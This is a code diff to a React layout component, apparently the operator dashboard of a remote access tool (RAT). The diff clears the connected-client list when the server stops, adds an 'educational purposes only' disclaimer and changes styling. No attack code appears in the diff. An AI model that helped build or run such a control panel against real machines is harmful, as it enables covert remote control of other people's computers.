@@ -49,7 +49,7 @@ const SidebarBurger = ({ color, icon: Icon }: any) => {
 export const Layout = () => {
   const location = useLocation();
 
-  const { port, setPort, setRunning, running, clientList } =
+  const { port, setPort, setRunning, running, clientList, setClientList } =
     useContext(RATContext)!;
 
   async function startServer() {
@@ -72,6 +72,7 @@ export const Layout = () => {
     let serverMessage = await stopServerCmd();
 
     if (serverMessage === "true") {
+      setClientList([]);
       toast.success("Server stopped successfully!", {
         className: `!bg-white !text-black !rounded-2xl !border-accentx`,
       });
@@ -115,6 +116,7 @@ export const Layout = () => {
 
         <div className="flex flex-col mt-auto text-xs text-gray-400 text-center gap-4">
           <p>{running ? `Listening on port ${port}` : "Not Listening"}</p>
+          <p>Made for educational purposes only!</p>
           <div className="flex flex-row justify-center items-center gap-1">
             <IconCopyright size={16} /> 2025
           </div>
@@ -168,7 +170,7 @@ export const Layout = () => {
         </header>
 
         {/* Page content */}
-        <main className="flex-1 overflow-auto m-3 bg-secondarybg text-black rounded-2xl">
+        <main className="flex-1 overflow-auto m-3 text-black rounded-2xl">
           <Outlet />
         </main>
       </div>
